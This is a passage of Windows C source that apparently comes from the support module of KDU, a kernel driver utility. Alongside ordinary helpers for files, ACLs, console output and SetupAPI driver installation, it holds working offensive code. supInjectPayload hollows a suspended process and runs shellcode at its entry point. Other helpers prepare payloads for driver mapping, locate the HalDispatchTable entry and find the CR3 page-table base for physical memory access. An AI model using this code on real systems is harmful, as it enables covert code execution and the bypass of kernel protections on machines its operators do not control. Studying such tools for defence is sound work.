    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    NTSTATUS    status;
    HANDLE      hFile = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    if (lpFileName == NULL)
        return NULL;

    usName.Buffer = NULL;

    do {

        if (!RtlDosPathNameToNtPathName_U(lpFileName, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supHeapAlloc(sz);
        if (Buffer) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supHeapFree(Buffer);
                Buffer = NULL;
            }
        }

    } while (FALSE);

    if (hFile != NULL) {
        NtClose(hFile);
    }

    if (usName.Buffer)
        RtlFreeUnicodeString(&usName);

    return Buffer;
}

/*
* supGetPML4FromLowStub1M
*
* Purpose:
*
* Search for PML4 (CR3) entry in low stub.
*
* Taken from MemProcFs, https://github.com/ufrisk/MemProcFS/blob/master/vmm/vmmwininit.c#L414
*
*/
ULONG_PTR supGetPML4FromLowStub1M(
    _In_ ULONG_PTR pbLowStub1M)
{
    ULONG offset = 0;
    ULONG_PTR PML4 = 0;
    ULONG cr3_offset = FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) +
        FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);

    SetLastError(ERROR_EXCEPTION_IN_SERVICE);

    __try {

        while (offset < 0x100000) {

            offset += 0x1000;

            if (0x00000001000600E9 != (0xffffffffffff00ff & *(UINT64*)(pbLowStub1M + offset))) //PROCESSOR_START_BLOCK->Jmp
                continue;

            if (0xfffff80000000000 != (0xfffff80000000003 & *(UINT64*)(pbLowStub1M + offset + FIELD_OFFSET(PROCESSOR_START_BLOCK, LmTarget))))
                continue;

            if (0xffffff0000000fff & *(UINT64*)(pbLowStub1M + offset + cr3_offset))
                continue;

            PML4 = *(UINT64*)(pbLowStub1M + offset + cr3_offset);
            break;
        }

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }

    SetLastError(ERROR_SUCCESS);

    return PML4;
}

/*
* supCreateSystemAdminAccessSD
*
* Purpose:
*
* Create security descriptor with Admin/System ACL set.
*
*/
NTSTATUS supCreateSystemAdminAccessSD(
    _Out_ PSECURITY_DESCRIPTOR * SecurityDescriptor,
    _Out_ PACL * DefaultAcl
)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    ULONG aclSize = 0;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PACL pAcl = NULL;
    PSECURITY_DESCRIPTOR securityDescriptor = NULL;

    UCHAR sidBuffer[2 * sizeof(SID)];

    *SecurityDescriptor = NULL;
    *DefaultAcl = NULL;

    do {

        RtlSecureZeroMemory(sidBuffer, sizeof(sidBuffer));

        securityDescriptor = (PSECURITY_DESCRIPTOR)supHeapAlloc(sizeof(SECURITY_DESCRIPTOR));
        if (securityDescriptor == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        aclSize += RtlLengthRequiredSid(1); //LocalSystem sid
        aclSize += RtlLengthRequiredSid(2); //Admin group sid
        aclSize += sizeof(ACL);
        aclSize += 2 * (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG));

        pAcl = (PACL)supHeapAlloc(aclSize);
        if (pAcl == NULL) {
            ntStatus = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        ntStatus = RtlCreateAcl(pAcl, aclSize, ACL_REVISION);
        if (!NT_SUCCESS(ntStatus))
            break;

        //
        // Local System - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 1);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_LOCAL_SYSTEM_RID;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        //
        // Admins - Generic All.
        //
        RtlInitializeSid(sidBuffer, &ntAuthority, 2);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_BUILTIN_DOMAIN_RID;
        *(RtlSubAuthoritySid(sidBuffer, 1)) = DOMAIN_ALIAS_RID_ADMINS;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        ntStatus = RtlCreateSecurityDescriptor(securityDescriptor,
            SECURITY_DESCRIPTOR_REVISION1);
        if (!NT_SUCCESS(ntStatus))
            break;

        ntStatus = RtlSetDaclSecurityDescriptor(securityDescriptor,
            TRUE,
            pAcl,
            FALSE);

        if (!NT_SUCCESS(ntStatus))
            break;

        *SecurityDescriptor = securityDescriptor;
        *DefaultAcl = pAcl;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (pAcl) supHeapFree(pAcl);

        if (securityDescriptor) {
            supHeapFree(securityDescriptor);
        }

        *SecurityDescriptor = NULL;
        *DefaultAcl = NULL;
    }

    return ntStatus;
}

/*
* supGetTimeAsSecondsSince1970
*
* Purpose:
*
* Return seconds since 1970.
*
*/
ULONG supGetTimeAsSecondsSince1970()
{
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;

    GetSystemTimeAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    return seconds;
}

/*
* supGetModuleBaseByName
*
* Purpose:
*
* Return module base address.
*
*/
ULONG_PTR supGetModuleBaseByName(
    _In_ LPCWSTR ModuleName,
    _Out_opt_ PULONG ImageSize
)
{
    ULONG_PTR ReturnAddress = 0;
    ULONG i, k;
    PRTL_PROCESS_MODULES miSpace;

    ANSI_STRING moduleName;

    if (ImageSize)
        *ImageSize = 0;

    moduleName.Buffer = NULL;
    moduleName.Length = moduleName.MaximumLength = 0;

    if (!NT_SUCCESS(supConvertToAnsi(ModuleName, &moduleName)))
        return 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace != NULL) {

        for (i = 0; i < miSpace->NumberOfModules; i++) {

            k = miSpace->Modules[i].OffsetToFileName;
            if (_strcmpi_a(
                (CONST CHAR*) & miSpace->Modules[i].FullPathName[k],
                moduleName.Buffer) == 0)
            {
                ReturnAddress = (ULONG_PTR)miSpace->Modules[i].ImageBase;
                if (ImageSize)
                    *ImageSize = miSpace->Modules[i].ImageSize;
                break;
            }

        }

        supHeapFree(miSpace);

    }

    RtlFreeAnsiString(&moduleName);

    return ReturnAddress;
}

/*
* supManageDummyDll
*
* Purpose:
*
* Drop dummy dll to the %temp% and load it to trigger ImageLoad notify callbacks.
* If fRemove set to TRUE then remove previously dropped file and return result of operation.
*
*/
BOOL supManageDummyDll(
    _In_ LPCWSTR lpDllName,
    _In_ BOOLEAN fRemove
)
{
    BOOL bResult = FALSE;
    ULONG dataSize = 0;
    PBYTE dataBuffer;
    PVOID dllHandle;

    LPWSTR lpFileName;
    SIZE_T Length = (1024 + _strlen(lpDllName)) * sizeof(WCHAR);

    //
    // Allocate space for filename.
    //
    lpFileName = (LPWSTR)supHeapAlloc(Length);
    if (lpFileName == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }


    if (fRemove) {

        HMODULE hModule = GetModuleHandle(lpDllName);

        if (hModule) {

            if (GetModuleFileName(hModule, lpFileName, MAX_PATH)) {
                FreeLibrary(hModule);
                bResult = DeleteFile(lpFileName);
            }

        }

    }
    else {

        DWORD cch = supExpandEnvironmentStrings(L"%temp%\\", lpFileName, MAX_PATH);
        if (cch == 0 || cch > MAX_PATH) {
            SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        }
        else {

            //
            // Extract file from resource and drop to the disk in %temp% directory.
            //
            dllHandle = (PVOID)GetModuleHandle(NULL);

            dataBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI64,
                dllHandle,
                &dataSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (dataBuffer) {

                _strcat(lpFileName, lpDllName);
                if (dataSize == supWriteBufferToFile(lpFileName,
                    dataBuffer,
                    dataSize,
                    TRUE,
                    FALSE,
                    NULL))
                {
                    //
                    // Finally load file and trigger image notify callbacks.
                    //
                    if (LoadLibraryEx(lpFileName, NULL, 0))
                        bResult = TRUE;
                }
            }
            else {
                SetLastError(ERROR_FILE_INVALID);
            }

        }
    }

    supHeapFree(lpFileName);

    return bResult;
}

/*
* supSelectNonPagedPoolTag
*
* Purpose:
*
* Query most used nonpaged pool tag.
*
*/
ULONG supSelectNonPagedPoolTag(
    VOID
)
{
    ULONG ulResult = SHELL_POOL_TAG;
    PSYSTEM_POOLTAG_INFORMATION pvPoolInfo;

    pvPoolInfo = (PSYSTEM_POOLTAG_INFORMATION)supGetSystemInfo(SystemPoolTagInformation);
    if (pvPoolInfo) {

        SIZE_T maxUse = 0;

        for (ULONG i = 0; i < pvPoolInfo->Count; i++) {

            if (pvPoolInfo->TagInfo[i].NonPagedUsed > maxUse) {
                maxUse = pvPoolInfo->TagInfo[i].NonPagedUsed;
                ulResult = pvPoolInfo->TagInfo[i].TagUlong;
            }

        }

        supHeapFree(pvPoolInfo);
    }

    return ulResult;
}

/*
* supLoadFileForMapping
*
* Purpose:
*
* Load input file for further driver mapping.
*
*/
NTSTATUS supLoadFileForMapping(
    _In_ LPCWSTR PayloadFileName,
    _Out_ PVOID * LoadBase
)
{
    NTSTATUS ntStatus;
    ULONG dllCharacteristics = IMAGE_FILE_EXECUTABLE_IMAGE;
    UNICODE_STRING usFileName;

    PVOID pvImage = NULL;
    PIMAGE_NT_HEADERS pNtHeaders;

    *LoadBase = NULL;

    //
    // Map input file as image.
    //
    RtlInitUnicodeString(&usFileName, PayloadFileName);
    ntStatus = LdrLoadDll(NULL, &dllCharacteristics, &usFileName, &pvImage);
    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        return ntStatus;
    }

    pNtHeaders = RtlImageNtHeader(pvImage);
    if (pNtHeaders == NULL) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    *LoadBase = pvImage;

    return STATUS_SUCCESS;
}

/*
* supPrintfEvent
*
* Purpose:
*
* Wrapper for printf_s for displaying specific events.
*
*/
VOID supPrintfEvent(
    _In_ KDU_EVENT_TYPE Event,
    _Printf_format_string_ LPCSTR Format,
    ...
)
{
    HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO screenBufferInfo;
    WORD origColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN, newColor;
    va_list args;

    //
    // Rememeber original text color.
    //
    if (GetConsoleScreenBufferInfo(stdHandle, &screenBufferInfo)) {
        origColor = *(&screenBufferInfo.wAttributes);
    }

    switch (Event) {
    case kduEventInformation:
        newColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
        break;
    case kduEventError:
        newColor = FOREGROUND_RED | FOREGROUND_INTENSITY;
        break;
    default:
        newColor = FOREGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN;
        break;
    }

    SetConsoleTextAttribute(stdHandle, newColor);

    //
    // Printf message.
    //
    va_start(args, Format);
    vprintf_s(Format, args);
    va_end(args);

    //
    // Restore original text color.
    //
    SetConsoleTextAttribute(stdHandle, origColor);
}

/*
* supQueryImageSize
*
* Purpose:
*
* Get image size from PEB loader list.
*
*/
NTSTATUS supQueryImageSize(
    _In_ PVOID ImageBase,
    _Out_ PSIZE_T ImageSize
)
{
    NTSTATUS ntStatus;
    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

    *ImageSize = 0;

    ntStatus = LdrFindEntryForAddress(
        ImageBase,
        &ldrEntry);

    if (NT_SUCCESS(ntStatus)) {

        *ImageSize = ldrEntry->SizeOfImage;

    }

    return ntStatus;
}

/*
* supxBinTextEncode
*
* Purpose:
*
* Create pseudo random string from UI64 value.
*
*/
VOID supxBinTextEncode(
    _In_ unsigned __int64 x,
    _Inout_ wchar_t* s
)
{
    char    tbl[64];
    char    c = 0;
    int     p;

    tbl[62] = '-';
    tbl[63] = '_';

    for (c = 0; c < 26; ++c)
    {
        tbl[c] = 'A' + c;
        tbl[26 + c] = 'a' + c;
        if (c < 10)
            tbl[52 + c] = '0' + c;
    }

    for (p = 0; p < 13; ++p)
    {
        c = x & 0x3f;
        x >>= 5;
        *s = (wchar_t)tbl[c];
        ++s;
    }

    *s = 0;
}

/*
* supGenerateSharedObjectName
*
* Purpose:
*
* Create pseudo random object name from it ID.
*
*/
VOID supGenerateSharedObjectName(
    _In_ WORD ObjectId,
    _Inout_ LPWSTR lpBuffer
)
{
    ULARGE_INTEGER value;

    value.LowPart = MAKELONG(
        MAKEWORD(KDU_VERSION_BUILD, KDU_VERSION_REVISION),
        MAKEWORD(KDU_VERSION_MINOR, KDU_VERSION_MAJOR));

    value.HighPart = MAKELONG(KDU_BASE_ID, ObjectId);

    supxBinTextEncode(value.QuadPart, lpBuffer);
}

/*
* supSetupInstallDriverFromInf
*
* Purpose:
*
* Install and load device driver through SetupAPI.
*
*/
BOOL supSetupInstallDriverFromInf(
    _In_ LPCWSTR InfName,
    _In_ BYTE* HardwareId,
    _In_ ULONG HardwareIdLength,
    _Out_ HDEVINFO* DeviceInfo,
    _Inout_ SP_DEVINFO_DATA* DeviceInfoData
)
{
    BOOL bResult = FALSE;
    GUID guid;
    HDEVINFO devInfo = NULL;
#define MAX_CLASS_NAME_LEN 256
    WCHAR className[MAX_CLASS_NAME_LEN];

    *DeviceInfo = NULL;

    do {

        RtlSecureZeroMemory(&className, sizeof(className));
        RtlSecureZeroMemory(DeviceInfoData, sizeof(SP_DEVINFO_DATA));
        DeviceInfoData->cbSize = sizeof(SP_DEVINFO_DATA);

        if (!SetupDiGetINFClass(
            InfName,
            &guid,
            (PWSTR)&className,
            MAX_CLASS_NAME_LEN,
            NULL))
        {
            break;
        }

        devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
        if (devInfo == INVALID_HANDLE_VALUE)
            break;

        if (!SetupDiCreateDeviceInfo(devInfo,
            className,
            &guid,
            NULL,
            NULL,
            DICD_GENERATE_ID,
            DeviceInfoData))
        {
            break;
        }

        if (!SetupDiSetDeviceRegistryProperty(devInfo,
            DeviceInfoData,
            SPDRP_HARDWAREID,
            HardwareId,
            HardwareIdLength))
        {
            break;
        }

        if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE,
            devInfo,
            DeviceInfoData))
        {
            break;
        }

        bResult = UpdateDriverForPlugAndPlayDevices(NULL,
            (LPCWSTR)HardwareId,
            InfName,
            INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE,
            NULL);

    } while (FALSE);

    if (bResult)
        *DeviceInfo = devInfo;

    return bResult;
}

/*
* supSetupRemoveDriver
*
* Purpose:
*
* Unload and remove device driver installed through SetupAPI.
*
*/
BOOL supSetupRemoveDriver(
    _In_ HDEVINFO DeviceInfo,
    _In_ SP_DEVINFO_DATA* DeviceInfoData
)
{
    if (DeviceInfo != INVALID_HANDLE_VALUE) {
        SetupDiRemoveDevice(DeviceInfo, DeviceInfoData);
        return SetupDiDestroyDeviceInfoList(DeviceInfo);
    }

    return FALSE;
}

/*
* supReplaceDllEntryPoint
*
* Purpose:
*
* Replace DLL entry point and optionally convert dll to exe.
*
*/
BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe
)
{
    BOOL bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD DllVirtualSize;
    PVOID DllBase, EntryPoint;

    NtHeaders = RtlImageNtHeader(DllImage);
    if (NtHeaders) {

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
        if (DllBase) {
            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                if (fConvertToExe)
                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);

                bResult = TRUE;
            }
            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supExtractFileFromDB
*
* Purpose:
*
* Extract requested file from resources.
*
*/
BOOL supExtractFileFromDB(
    _In_ HMODULE ImageBase,
    _In_ LPCWSTR FileName,
    _In_ ULONG FileId
)
{
    NTSTATUS ntStatus;
    ULONG resourceSize = 0, writeBytes = 0;
    PBYTE fileBuffer;

    fileBuffer = (PBYTE)KDULoadResource(FileId,
        ImageBase,
        &resourceSize,
        PROVIDER_RES_KEY,
        TRUE);

    if (fileBuffer == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Requested data id cannot be found %lu\r\n", FileId);

        return FALSE;

    }

    writeBytes = (ULONG)supWriteBufferToFile(FileName,
        fileBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus);

    supHeapFree(fileBuffer);

    if (resourceSize != writeBytes) {

        supPrintfEvent(kduEventError,
            "[!] Unable to extract data, NTSTATUS (0x%lX)\r\n", ntStatus);

        return FALSE;
    }

    return TRUE;
}

/*
* supExtractFileToTemp
*
* Purpose:
*
* Save given file to local %temp%.
*
*/
VOID supExtractFileToTemp(
    _In_opt_ HMODULE ImageBase,
    _In_opt_ ULONG FileResourceId,
    _In_ LPCWSTR lpTempPath,
    _In_ LPCWSTR lpFileName,
    _In_ BOOL fDelete)
{
    WCHAR szFileName[MAX_PATH * 2];

    RtlSecureZeroMemory(&szFileName, sizeof(szFileName));
    StringCchPrintf(szFileName,
        MAX_PATH * 2,
        TEXT("%ws\\%ws"),
        lpTempPath,
        lpFileName);

    if (fDelete) {
        DeleteFile(szFileName);
    }
    else {
        if (ImageBase) {
            supExtractFileFromDB(ImageBase, szFileName, FileResourceId);
        }
    }
}

/*
* supDeleteFileWithWait
*
* Purpose:
*
* Removes file from disk.
*
*/
BOOL supDeleteFileWithWait(
    _In_ ULONG WaitMilliseconds,
    _In_ ULONG NumberOfAttempts,
    _In_ LPCWSTR lpFileName
)
{
    ULONG retryCount = NumberOfAttempts;

    do {

        Sleep(WaitMilliseconds);
        if (DeleteFile(lpFileName)) {
            return TRUE;
        }

        retryCount--;

    } while (retryCount);

    return FALSE;
}

/*
* supMapFileAsImage
*
* Purpose:
*
* Create file mapping with SEC_IMAGE flag.
*
*/
PVOID supMapFileAsImage(
    _In_ LPWSTR lpImagePath
)
{
    HANDLE hFile, hMapping = NULL;
    PVOID  pvImageBase = NULL;

    hFile = CreateFile(lpImagePath,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        hMapping = CreateFileMapping(hFile,
            NULL,
            PAGE_READONLY | SEC_IMAGE,
            0,
            0,
            NULL);

        if (hMapping != NULL) {

            pvImageBase = MapViewOfFile(hMapping,
                FILE_MAP_READ, 0, 0, 0);

            CloseHandle(hMapping);
        }
        CloseHandle(hFile);
    }
    return pvImageBase;
}

/*
* supGetEntryPointForMappedFile
*
* Purpose:
*
* Return adjusted entry point address within mapped file.
*
*/
PVOID supGetEntryPointForMappedFile(
    _In_ PVOID ImageBase
)
{
    PIMAGE_DOS_HEADER		 dosHeader = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_FILE_HEADER		 fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER32 oh32 = (PIMAGE_OPTIONAL_HEADER32)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
    PIMAGE_OPTIONAL_HEADER64 oh64 = (PIMAGE_OPTIONAL_HEADER64)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));

    if (fileHeader->Machine == IMAGE_FILE_MACHINE_I386) {
#pragma warning(push)
#pragma warning(disable: 4312)
        return RtlOffsetToPointer(oh32->ImageBase, oh32->AddressOfEntryPoint);
#pragma warning(pop)
    }
    else if (fileHeader->Machine == IMAGE_FILE_MACHINE_AMD64) {
        return RtlOffsetToPointer(oh64->ImageBase, oh64->AddressOfEntryPoint);
    }
    else
        return NULL;
}

/*
* supInjectPayload
*
* Purpose:
*
* Run payload shellcode at app entry point.
*
*/
NTSTATUS supInjectPayload(
    _In_ PVOID pvTargetImage,
    _In_ PVOID pvShellCode,
    _In_ ULONG cbShellCode,
    _In_ LPWSTR lpTargetModule,
    _Out_ PHANDLE phZombieProcess
)
{
    NTSTATUS                    ntStatus;
    ULONG                       offset, returnLength = 0;
    HANDLE                      sectionHandle = NULL;

    PIMAGE_DOS_HEADER           dosHeader;
    PIMAGE_FILE_HEADER          fileHeader;
    PIMAGE_OPTIONAL_HEADER      optHeader;

    LPVOID                      pvImageBase = NULL, pvLocalBase;
    SIZE_T                      viewSize, readBytes = 0;
    LARGE_INTEGER               secMaxSize;

    PROCESS_BASIC_INFORMATION   processBasicInfo;
    PROCESS_INFORMATION         processInfo;
    STARTUPINFO                 startupInfo;

    do {

        *phZombieProcess = NULL;

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);

        processInfo.hProcess = NULL;
        processInfo.hThread = NULL;

        dosHeader = (PIMAGE_DOS_HEADER)pvTargetImage;
        fileHeader = (PIMAGE_FILE_HEADER)((PBYTE)dosHeader + sizeof(DWORD) + dosHeader->e_lfanew);
        optHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileHeader + sizeof(IMAGE_FILE_HEADER));
        secMaxSize.QuadPart = optHeader->SizeOfImage;

        if (fileHeader->Machine != IMAGE_FILE_MACHINE_I386 &&
            fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64)
        {
            ntStatus = STATUS_NOT_SUPPORTED;
            break;
        }

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            NULL,
            &secMaxSize,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        SetLastError(0);

        if (!CreateProcess(NULL,
            lpTargetModule,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &startupInfo,
            &processInfo))
        {
            ntStatus = STATUS_FATAL_APP_EXIT;
            break;
        }

        ntStatus = NtQueryInformationProcess(processInfo.hProcess,
            ProcessBasicInformation,
            &processBasicInfo,
            sizeof(PROCESS_BASIC_INFORMATION),
            &returnLength);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        offset = FIELD_OFFSET(PEB, ImageBaseAddress);

        if (!ReadProcessMemory(processInfo.hProcess,
            RtlOffsetToPointer(processBasicInfo.PebBaseAddress, offset),
            &pvImageBase,
            sizeof(PVOID),
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        viewSize = optHeader->SizeOfImage;
        pvLocalBase = NULL;

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvLocalBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewUnmap,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        if (!ReadProcessMemory(processInfo.hProcess,
            pvImageBase,
            pvLocalBase,
            optHeader->SizeOfImage,
            &readBytes))
        {
            ntStatus = STATUS_UNEXPECTED_IO_ERROR;
            break;
        }

        ntStatus = NtUnmapViewOfSection(processInfo.hProcess, pvImageBase);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        viewSize = optHeader->SizeOfImage;

        ntStatus = NtMapViewOfSection(sectionHandle,
            processInfo.hProcess,
            &pvImageBase,
            0,
            optHeader->SizeOfImage,
            NULL,
            &viewSize,
            ViewShare,
            0,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(ntStatus)) {
            break;
        }

        RtlCopyMemory(RtlOffsetToPointer(pvLocalBase, optHeader->AddressOfEntryPoint),
            pvShellCode,
            cbShellCode);

        ResumeThread(processInfo.hThread);

        *phZombieProcess = processInfo.hProcess;

    } while (FALSE);

    if (!NT_SUCCESS(ntStatus)) {

        if (processInfo.hProcess != NULL)
            CloseHandle(processInfo.hProcess);

    }

    if (sectionHandle != NULL)
        NtClose(sectionHandle);

    if (processInfo.hThread != NULL)
        CloseHandle(processInfo.hThread);

    return ntStatus;
}

/*
* supFilterDeviceIoControl
*
* Purpose:
*
* Call filter driver.
*
* Simplified fltlib!FilterpDeviceIoControl
*
*/
NTSTATUS supFilterDeviceIoControl(
    _In_ HANDLE Handle,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_(InBufferSize) PVOID InBuffer,
    _In_ ULONG InBufferSize,
    _Out_writes_bytes_to_opt_(OutBufferSize, *BytesReturned) PVOID OutBuffer,
    _In_ ULONG OutBufferSize,
    _Out_opt_ PULONG BytesReturned
)
{
    NTSTATUS ntStatus;

    if (BytesReturned)
        *BytesReturned = 0;

    IO_STATUS_BLOCK ioStatusBlock;

    if (DEVICE_TYPE_FROM_CTL_CODE(IoControlCode) == FILE_DEVICE_FILE_SYSTEM) {
        ntStatus = NtFsControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }
    else {

        ntStatus = NtDeviceIoControlFile(Handle,
            NULL,
            NULL,
            NULL,
            &ioStatusBlock,
            IoControlCode,
            InBuffer,
            InBufferSize,
            OutBuffer,
            OutBufferSize);
    }

    if (ntStatus == STATUS_PENDING) {
        ntStatus = NtWaitForSingleObject(Handle, FALSE, NULL);
        if (NT_SUCCESS(ntStatus))
            ntStatus = ioStatusBlock.Status;
    }

    if (BytesReturned)
        *BytesReturned = (ULONG)ioStatusBlock.Information;

    return ntStatus;
}

/*
* supGetHalQuerySystemInformation
*
* Purpose:
*
* Return address of HalQuerySystemInformation in HalDispatchTable structure.
*
*/
ULONG_PTR supGetHalQuerySystemInformation(
    _In_ ULONG_PTR NtOsLoadedBase,
    _In_ ULONG_PTR NtOsMappedBase
)
{
    ULONG_PTR base = NtOsLoadedBase, address, result = 0;

    address = (ULONG_PTR)GetProcAddress((HINSTANCE)NtOsMappedBase, "HalDispatchTable");
    if (address) {

        address += sizeof(ULONG_PTR); //skip aligned Version field
        address = base + address - (ULONG_PTR)NtOsMappedBase;
        result = address;

    }

    return result;
}

/*
* supQueryPhysicalMemoryLayout
*
* Purpose:
*
* Read physical memory layout from registry.
*
*/
PCM_RESOURCE_LIST supQueryPhysicalMemoryLayout(
    VOID
)
{
    LPCWSTR lpKey = L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    LPCWSTR lpValue = L".Translated";
    HKEY hKey;
    DWORD dwType = REG_RESOURCE_LIST, cbData = 0;
    PCM_RESOURCE_LIST pList = NULL;

    LRESULT result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpKey, 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {

        result = RegQueryValueExW(hKey, lpValue, 0, &dwType, NULL, &cbData);

        if (result == ERROR_SUCCESS) {

            pList = (PCM_RESOURCE_LIST)supHeapAlloc((SIZE_T)cbData);
            if (pList) {
                RegQueryValueExW(hKey, lpValue, 0, &dwType, (LPBYTE)pList, &cbData);
            }
        }

        RegCloseKey(hKey);
    }

    return pList;
}

/*
* supEnumeratePhysicalMemory
*
* Purpose:
*
* Enumerate physical memory and run callback for each page.
*
*/
BOOL supEnumeratePhysicalMemory(
    _In_ pfnPhysMemEnumCallback Callback,
    _In_ PVOID UserContext
)
{
    PCM_PARTIAL_RESOURCE_DESCRIPTOR pPartialDesc;
    PCM_FULL_RESOURCE_DESCRIPTOR pDesc;
    PCM_RESOURCE_LIST pList = supQueryPhysicalMemoryLayout();

    if (pList == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return FALSE;
    }

    for (ULONG i = 0; i < pList->Count; i++) {

        pDesc = &pList->List[i];

        for (ULONG j = 0; j < pDesc->PartialResourceList.Count; j++) {

            pPartialDesc = &pDesc->PartialResourceList.PartialDescriptors[j];
            if (pPartialDesc->Type == CmResourceTypeMemory ||
                pPartialDesc->Type == CmResourceTypeMemoryLarge)
            {
                ULONGLONG length = pPartialDesc->u.Memory.Length;

